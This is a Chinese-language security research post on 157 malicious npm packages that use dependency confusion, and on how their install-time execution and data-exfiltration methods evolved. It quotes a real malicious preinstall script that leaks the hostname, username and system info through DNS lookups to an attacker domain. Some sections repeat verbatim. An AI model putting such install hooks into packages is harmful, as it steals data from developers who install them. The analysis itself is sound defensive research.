
​        近两周，天问npm实时监测平台捕获到157个针对npm生态进行供应链攻击的恶意包，从攻击方式上来看这些包都属于依赖混淆类型的攻击，但是具体的攻击手段逐渐趋于成熟。从最简单的scripts字段命令执行到后续js文件混淆、加密执行，再到利用私有源投放恶意包的操作，执行恶意代码的方式越来越隐蔽。对于恶意代码执行后，攻击者如何有效拿回目标敏感信息的方式也多种多样，从直接使用post/get请求返回数据到利用DNS请求分片回传数据，再到对回传的数据进行对称加密。数据传输的方式也越发的隐蔽。
前言
​        2021年2月9日，国外安全研究员Alex Birsan公布了名为依赖混淆的攻击手法。这是一种利用开发人员错误配置以及npm等软件生态中包管理器的设计缺陷来实现的新型供应链攻击形式。自从这种攻击方式慢慢被安全研究者和恶意攻击者熟悉之后，在npm生态中与此相关的包就层出不穷。同时，具体的攻击触发方式也在朝着更加隐蔽的方法演变着。
攻击手段演变史
​        首先，所有的攻击的方式的起始都是需要拿到一个可以被依赖的关键包名，通过这个包名构建合适的版本号来使得恶意包通过依赖混淆的方式被目标安装，从而触发后续的攻击手段。目前看来后续的攻击手段都是以拿到用户机器上关键信息为主。例如主机名、内核信息、ipconfig信息、工作目录绝对路径、passwd信息等。

危险的script字段​        在npm包的packages.json中可以指定script字段内容来构建命令的执行。换句话说，就是scripts字段中的命令具有执行shell命令的权限，所以较为浅显攻击所构建的命令都是直接写在scripts中。如恶意包@aznb/extension-gather@1.2.3的scripts字段所示

将执行的文件进行js混淆​        对所要执行的文件进行js混淆是针对之前方法的改进，如果说以上的几种方式都还可以通过代码的静态扫描检测到，那么当代码进行了混淆之后，就很难在不行执行代码的情况下知道代码的意图是否恶意。这里我们以@dobux/hooks为例进行分析。这个包在早期发布的第一个版本中并未对代码进行混淆，这就让我们的分析更加容易了，同时也发现该包在回传所获取到的敏感信息时，对信息也进行了加密，得益于第一个未混淆的版本，该加密方式和公钥证书也被我们拿到。

结语
​        在过去一年里，供应链攻击的频率逐渐提升，攻击的手段也愈发成熟。天问npm监测平台综合了npm依赖分析，实时源同步，天穹沙箱分析等功能，致力于发现npm生态中的供应链安全问题。在过去两周里，天问npm实时监测平台持续运行，共计发现157个npm恶意包。经过整理，这些恶意包的相关信息将在附录表格中给出。欢迎其他研究者一起交流分享所得，共同推动供应链安全的相关研究。

危险的script字段
​        在npm包的packages.json中可以指定script字段内容来构建命令的执行。换句话说，就是scripts字段中的命令具有执行shell命令的权限，所以较为浅显攻击所构建的命令都是直接写在scripts中。如恶意包@aznb/extension-gather@1.2.3的scripts字段所示

1
2
3
4	"scripts" : {
    "test" : "echo \"Error: no test specified\" && exit 1", 
    "preinstall" : "nslookup a.x$(hostname).sub.0xczar.com && nslookup a.x$(whoami).sub.0xczar.com && nslookup a.x$(uname -a |base64).sub.0xczar.com"
},
执行恶意的js文件
​        直接将指令构建在scripts字段中会不便于做更多的操作，所以攻击者将想要执行的代码写到一个js文件中，在scripts字段中直接执行这个js文件即可，如恶意包mswebauthn-polyfil@2.0.0的scripts字段所示，在安装阶段执行node index.js

将执行的文件进行js混淆
​        对所要执行的文件进行js混淆是针对之前方法的改进，如果说以上的几种方式都还可以通过代码的静态扫描检测到，那么当代码进行了混淆之后，就很难在不行执行代码的情况下知道代码的意图是否恶意。这里我们以@dobux/hooks为例进行分析。这个包在早期发布的第一个版本中并未对代码进行混淆，这就让我们的分析更加容易了，同时也发现该包在回传所获取到的敏感信息时，对信息也进行了加密，得益于第一个未混淆的版本，该加密方式和公钥证书也被我们拿到。
